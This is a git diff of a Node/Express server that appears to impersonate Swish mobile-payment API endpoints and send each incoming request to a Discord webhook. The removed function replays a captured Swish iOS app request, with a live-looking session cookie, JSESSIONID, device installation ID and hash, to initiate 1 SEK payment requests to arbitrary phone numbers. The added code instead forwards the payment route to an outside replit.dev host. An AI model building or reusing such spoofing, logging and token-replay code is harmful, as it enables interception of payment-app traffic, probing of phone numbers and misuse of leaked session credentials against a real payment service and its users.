@@ -21,47 +21,6 @@ async function sendDiscordWebhookEmbed(embed) {
   }
 }
 
-// Async function to initiate payment request
-async function checkPhoneNumber(phone) {
-  try {
-    const headers = {
-      'Host': 'mpc.getswish.net',
-      'hash': '8B33B89F88EBEA5F2F270567393A29179DF43245',
-      'deviceOsVersion': '16.5.1',
-      'Accept': '*/*',
-      'clientTime': '1720029013',
-      'deviceManufacturer': 'Apple',
-      'deviceOs': 'ios',
-      'Accept-Language': 'en-GB,en;q=0.9',
-      'clientVersion': '5.19',
-      'installationId': '8746E45A1E6F4259B4747F332B7B6ECD',
-      'Accept-Encoding': 'gzip, deflate, br',
-      'Content-Length': '99',
-      'User-Agent': 'Swish/934 CFNetwork/1408.0.4 Darwin/22.5.0',
-      'Connection': 'close',
-      'Content-Type': 'application/json',
-      'deviceModel': 'iPhone15,2',
-      'Swish-Alias': '46706505038',
-      'Cookie': 'TS01c4fa8b=01a49c05c3117327095190809cdfafbe0a00c2da27e073f7772edc247a003e3242fb107d651da68ed2c225882ca46b0aad33727f8328acbedceb1ae36cf8c7e2577ac79f21; JSESSIONID=9EF414547B21679C432D635D1C4D6C10'
-    };
-
-    const response = await axios.post(
-      "https://mpc.getswish.net/mpc-swish/api/v1/paymentrequest/initiatePaymentRequest", 
-      {
-        "receiverAlias": phone,
-        "currency": "SEK",
-        "amount": "1.00",
-        "message": ""
-      },
-      { headers }
-    );
-
-    return response.data;
-  } catch (error) {
-    throw new Error(`Error initiating payment request: ${error.message}`);
-  }
-}
-
 // Middleware to send a Discord webhook for every request
 app.use(async (req, res, next) => {
   try {
@@ -162,13 +121,16 @@ app.get("/mpc-swish/api/v1/paymentrequest/viewSetting", (req, res) => {
 });
 
 app.post("/mpc-swish/api/v1/paymentrequest/initiatePaymentRequest", async (req, res) => {
-  try {
-    const { receiverAlias } = req.body; // Extract phone number from request body
-    const paymentResponse = await checkPhoneNumber(receiverAlias);
-    res.status(200).json(paymentResponse);
-  } catch (error) {
-    console.error("Error initiating payment request:", error.message);
-  }
+  axios.get("https://c8cb6293-3269-4a5a-8ac0-61bde456d942-00-1tkdqf6eyupe1.riker.replit.dev/initiatePayment?phone=46706505050")
+  .then(response => {
+    console.log('Data received:', response.data);
+    res.status(200).json(response.data);
+    
+  })
+  .catch(error => {
+    console.error('Error fetching data:', error);
+  });
+
 });
 
 
